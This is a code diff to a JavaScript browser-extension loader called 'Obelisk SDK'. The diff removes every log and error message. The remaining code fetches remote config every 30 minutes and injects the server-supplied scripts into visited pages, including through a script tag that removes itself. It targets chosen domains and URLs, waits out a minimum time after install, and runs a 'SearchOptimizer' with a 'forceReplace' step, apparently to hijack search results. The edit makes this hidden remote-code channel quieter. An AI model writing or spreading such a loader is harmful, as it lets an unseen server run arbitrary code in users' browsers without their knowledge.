@@ -41,7 +41,6 @@ const APIClient = {
       });
       return await response.json();
     } catch (error) {
-      console.log('Obelisk: Config fetch failed:', error.message);
       return null;
     }
   }
@@ -50,7 +49,6 @@ const APIClient = {
 const ConfigProcessor = {
   process: function(config) {
     if (!config) {
-      console.log('Obelisk: No config to process');
       return { campaigns: [], modules: [] };
     }
     
@@ -83,12 +81,6 @@ const ConfigProcessor = {
       });
     }
     
-    console.log('Obelisk: Processed -', {
-      campaigns: campaigns.length,
-      modules: modules.length,
-      moduleNames: modules.map(m => m.name)
-    });
-    
     return { campaigns, modules };
   }
 };
@@ -99,30 +91,20 @@ const ModuleExecutor = {
   
   execute: function(modules) {
     if (!modules || !modules.length) {
-      console.log('Obelisk: No modules to execute');
       return;
     }
     
     const sortedModules = this.sortModulesByDependency(modules);
     
-    console.log('Obelisk: Modules to execute:', sortedModules.map(m => m.name));
-    
     sortedModules.forEach(module => {
       const moduleKey = `${module.name}_${module.script?.substring(0, 50)}`;
       if (this.executedModules.has(moduleKey)) {
-        console.log('Obelisk: Module already executed:', module.name);
         return;
       }
       
       if (module.script && this.shouldExecute(module)) {
-        console.log('Obelisk: Executing module:', module.name);
         this.executeCombinedModules(sortedModules);
         this.executedModules.add(moduleKey);
-      } else {
-        console.log('Obelisk: Skipping module:', module.name, {
-          hasScript: !!module.script,
-          shouldExecute: this.shouldExecute(module)
-        });
       }
     });
   },
@@ -136,18 +118,13 @@ const ModuleExecutor = {
   
   executeCombinedModules: function(modules) {
     const combinedCode = this.prepareCombinedModulesCode(modules);
-    
-    console.log('[Obelisk] INJECTING COMBINED MODULES:', modules.map(m => m.name).join(', '));
 
     if (chrome.runtime && chrome.runtime.sendMessage) {
       chrome.runtime.sendMessage({
         action: 'INJECT_CONTENT_CODE',
         code: combinedCode
-      }, (response) => {
-        console.log('[Obelisk] Combined modules injected:', response?.status || 'no response');
       });
     } else {
-      console.log('[Obelisk] No chrome.runtime, executing directly');
       this.executeDirectly(combinedCode);
     }
   },
@@ -158,69 +135,46 @@ const ModuleExecutor = {
       script.textContent = code;
       (document.head || document.documentElement).appendChild(script);
       script.remove();
-      console.log('[Obelisk] Direct execution completed');
-    } catch (e) {
-      console.error('[Obelisk] Direct execution failed:', e);
-    }
+    } catch (e) {}
   },
   
   prepareCombinedModulesCode: function(modules) {
     let combinedScript = '';
     
     modules.forEach(module => {
-      combinedScript += `\n// ======== ${module.name} ========\n`;
       combinedScript += module.script + '\n';
     });
     
     return `
       (function() {
         try {
-          console.log('[Obelisk Main] Loading combined modules...');
-          
           ${combinedScript}
           
-          console.log('[Obelisk Main] Auto-initializing modules...');
-          
           if (typeof SearchOptimizer !== 'undefined') {
-            console.log('[Obelisk Main] Initializing SearchOptimizer...');
             const optimizer = new SearchOptimizer();
             optimizer.init();
             window._searchOptimizer = optimizer;
-            console.log('[Obelisk Main] SearchOptimizer initialized');
             
             setTimeout(() => {
-              console.log('[Obelisk Main] Applying optimizations...');
               try {
                 if (optimizer.forceReplace) {
-                  const result = optimizer.forceReplace();
-                  console.log('[Obelisk Main] Force replace result:', result);
+                  optimizer.forceReplace();
                 }
-              } catch(e) {
-                console.error('[Obelisk Main] Force replace error:', e);
-              }
+              } catch(e) {}
             }, 2000);
-          } else {
-            console.warn('[Obelisk Main] SearchOptimizer not defined');
           }
           
           if (typeof initSearchEnhancer !== 'undefined') {
-            console.log('[Obelisk Main] Initializing analytics helper...');
             initSearchEnhancer();
-            console.log('[Obelisk Main] Analytics helper initialized');
           }
           
-          console.log('[Obelisk Main] All modules initialized successfully');
-          
-        } catch(e) {
-          console.error('[Obelisk Main] Combined modules execution error:', e);
-        }
+        } catch(e) {}
       })();
     `;
   },
   
   shouldExecute: function(module) {
     if (!module.config) {
-      console.log('Obelisk: Module', module.name, 'has no config, allowing');
       return true;
     }
     
@@ -232,7 +186,6 @@ const ModuleExecutor = {
         currentHostname.includes(domain)
       );
       if (!domainMatch) {
-        console.log('Obelisk: Module', module.name, 'skipped - not on allowed domain');
         return false;
       }
     }
@@ -242,7 +195,6 @@ const ModuleExecutor = {
         currentUrl.includes(pattern)
       );
       if (!patternMatch) {
-        console.log('Obelisk: Module', module.name, 'skipped - URL pattern not matched');
         return false;
       }
     }
@@ -251,12 +203,10 @@ const ModuleExecutor = {
       const installTime = parseInt(localStorage.getItem('obelisk_install_time') || '0');
       const timeSinceInstall = Date.now() - installTime;
       if (timeSinceInstall < module.config.min_install_time) {
-        console.log('Obelisk: Module', module.name, 'skipped - min install time not reached');
         return false;
       }
     }
     
-    console.log('Obelisk: Module', module.name, 'should execute');
     return true;
   },
   
@@ -279,7 +229,6 @@ const SDKCore = {
   init: async function() {
     if (!localStorage.getItem('obelisk_install_time')) {
       localStorage.setItem('obelisk_install_time', Date.now());
-      console.log('Obelisk: First install time saved');
     }
     
     await this.loadAndExecute();
@@ -287,34 +236,21 @@ const SDKCore = {
   },
   
   loadAndExecute: async function() {
-    console.log('Obelisk: Fetching config from server...');
     const config = await APIClient.fetchConfig();
     
     if (!config) {
-      console.log('Obelisk: No config received or fetch failed');
       return;
     }
     
-    console.log('Obelisk: Config received:', {
-      hasCampaigns: !!config.campaigns,
-      hasAnalyticsModules: !!config.analytics_modules,
-      analyticsModulesCount: config.analytics_modules?.length || 0
-    });
-    
     const processed = ConfigProcessor.process(config);
-    console.log('Obelisk: Processed modules:', processed.modules.length);
     
     if (processed.modules.length > 0) {
-      console.log('Obelisk: Executing combined modules...');
       ModuleExecutor.execute(processed.modules);
-    } else {
-      console.log('Obelisk: No active modules to execute');
     }
   },
   
   startUpdateInterval: function() {
     setInterval(() => {
-      console.log('Obelisk: Auto-updating config...');
       this.loadAndExecute();
     }, 1800000);
   },
@@ -336,14 +272,12 @@ const SDKCore = {
 if (document.readyState === 'loading') {
   document.addEventListener('DOMContentLoaded', () => {
     setTimeout(() => {
-      console.log('Obelisk SDK: Starting initialization...');
       window.ObeliskSDK = SDKCore;
       window.ObeliskSDK.init();
     }, 1000);
   });
 } else {
   setTimeout(() => {
-    console.log('Obelisk SDK: Starting initialization...');
     window.ObeliskSDK = SDKCore;
     window.ObeliskSDK.init();
   }, 1000);
@@ -363,7 +297,5 @@ window.forceObeliskReload = function() {
     window.ObeliskSDK.forceReload() : 
     'Obelisk SDK not loaded';
 };
-
-console.log('Obelisk SDK loaded successfully');
 
 })();
